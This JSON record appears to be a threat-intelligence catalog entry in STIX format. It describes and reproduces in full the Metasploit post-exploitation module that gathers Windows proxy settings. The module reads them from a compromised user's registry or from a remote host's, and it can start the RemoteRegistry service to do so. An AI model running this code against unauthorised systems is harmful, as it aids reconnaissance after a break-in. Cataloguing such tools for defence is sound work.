{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d8efcccd-d961-42e9-974d-9bf14598246e",
    "created": "2024-08-14T16:33:05.031957Z",
    "modified": "2024-08-14T16:33:05.031961Z",
    "name": "Windows Gather Proxy Setting",
    "description": " This module pulls a user's proxy settings. If neither RHOST or SID are set it pulls the current user, else it will pull the user's settings for the specified SID and target host. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_proxy.rb",
            "external_id": "enum_proxy.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Services\n\n  def initialize\n    super(\n      'Name' => 'Windows Gather Proxy Setting',\n      'Description' => %q{\n        This module pulls a user's proxy settings. If neither RHOST or SID\n        are set it pulls the current user, else it will pull the user's settings\n        for the specified SID and target host.\n      },\n      'Author' => [ 'mubix' ],\n      'License' => MSF_LICENSE,\n      'Platform' => [ 'win' ],\n      'SessionTypes' => %w[meterpreter powershell shell],\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'Reliability' => [],\n        'SideEffects' => []\n      },\n      'Compat' => {\n        'Meterpreter' => {\n          'Commands' => %w[\n            stdapi_registry_open_key\n            stdapi_registry_open_remote_key\n          ]\n        }\n      }\n    )\n\n    register_options([\n      OptAddress.new('RHOST', [ false, 'Remote host to clone settings to, defaults to local' ]),\n      OptString.new('SID', [ false, 'SID of user to clone settings to (SYSTEM is S-1-5-18)' ])\n    ])\n  end\n\n  def run\n    if datastore['SID']\n      root_key, base_key = split_key(\"HKU\\\\#{datastore['SID']}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Connections\")\n    else\n      root_key, base_key = split_key('HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Connections')\n    end\n\n    if datastore['RHOST']\n      if session.type != 'meterpreter'\n        fail_with(Failure::BadConfig, \"Cannot query remote registry on #{datastore['RHOST']}. Unsupported sesssion type #{session.type}\")\n      end\n\n      begin\n        key = session.sys.registry.open_remote_key(datastore['RHOST'], root_key)\n      rescue ::Rex::Post::Meterpreter::RequestError\n        print_error(\"Unable to contact remote registry service on #{datastore['RHOST']}\")\n        print_status('Attempting to start RemoteRegistry service remotely...')\n        begin\n          service_start('RemoteRegistry', datastore['RHOST'])\n        rescue StandardError\n          fail_with(Failure::Unknown, 'Unable to start RemoteRegistry service, exiting...')\n        end\n        startedreg = true\n        key = session.sys.registry.open_remote_key(datastore['RHOST'], root_key)\n      end\n\n      open_key = key.open_key(base_key)\n      values = open_key.query_value('DefaultConnectionSettings')\n      data = values.data\n\n      # If we started the service we need to stop it.\n      service_stop('RemoteRegistry', datastore['RHOST']) if startedreg\n    else\n      data = registry_getvaldata(\"#{root_key}\\\\#{base_key}\", 'DefaultConnectionSettings')\n    end\n\n    fail_with(Failure::Unknown, \"Could not retrieve 'DefaultConnectionSettings' data\") if data.blank?\n    fail_with(Failure::Unknown, \"Retrieved malformed proxy settings (too small: #{data.length} bytes <= 24 bytes)\") if data.length <= 24\n\n    print_status(\"Proxy Counter = #{data[4, 1].unpack('C*')[0]}\")\n\n    case data[8, 1].unpack('C*')[0]\n    when 1\n      print_status('Setting: No proxy settings')\n    when 3\n      print_status('Setting: Proxy server')\n    when 5\n      print_status('Setting: Set proxy via AutoConfigure script')\n    when 7\n      print_status('Setting: Proxy server and AutoConfigure script')\n    when 9\n      print_status('Setting: WPAD')\n    when 11\n      print_status('Setting: WPAD and Proxy server')\n    when 13\n      print_status('Setting: WPAD and AutoConfigure script')\n    when 15\n      print_status('Setting: WPAD, Proxy server and AutoConfigure script')\n    else\n      print_status('Setting: Unknown proxy setting found')\n    end\n\n    cursor = 12\n    proxyserver = data[cursor + 4, data[cursor, 1].unpack('C*')[0]]\n    print_status(\"Proxy Server: #{proxyserver}\") unless proxyserver.blank?\n\n    cursor = cursor + 4 + data[cursor].unpack('C*')[0]\n    additionalinfo = data[cursor + 4, data[cursor, 1].unpack('C*')[0]]\n    print_status(\"Additional Info: #{additionalinfo}\") unless additionalinfo.blank?\n\n    cursor = cursor + 4 + data[cursor].unpack('C*')[0]\n    autoconfigurl = data[cursor + 4, data[cursor, 1].unpack('C*')[0]]\n    print_status(\"AutoConfigURL: #{autoconfigurl}\") unless autoconfigurl.blank?\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}